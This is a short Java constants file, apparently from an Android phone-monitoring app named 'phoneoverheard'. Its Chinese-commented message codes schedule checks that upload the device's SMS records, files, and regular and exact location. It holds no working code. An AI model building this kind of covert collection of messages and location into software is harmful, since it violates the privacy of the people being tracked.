package com.phoneoverheard.interfaces;

public class Constant {

	/**
	 * 系统定时广播
	 */
	public static final String INTENT_ACTION_TIMER_SYSTEM = "com.timer_system";
	/**
	 * 定时检查提交评价短信
	 */
	public static final String INTENT_ACTION_TIMER_CHECK_TO_SUBMIT = "com.timer_check_to_submit";
	/**
	 * 记录上次的清理时间
	 */
	public static final String KEY_TIME_TO_CLEAN = "KEY_TIME_TO_CLEAN";

	/**
	 * 定时检测时间间隔
	 */
	public static int ALARM_INTERVAL_HOUR_TO_CHECK_SUBMIT = 1;

	/**************************** 消息码 ************************************************/
	/**
	 * 检查常态定位并上传
	 */
	public static final int MSG_CODE_CHECK_LOC_NORMAL = 1;
	/**
	 * 检查短信表并上传
	 */
	public static final int MSG_CODE_CHECK_SMS = 2;
	/**
	 * 检查文件表并上传
	 */
	public static final int MSG_CODE_CHECK_FILE_UPLOAD = 3;
	
	/**
	 * 检查文件表并上传
	 */
	public static final int MSG_CODE_CHECK_LOC_EXACT = 4;
}
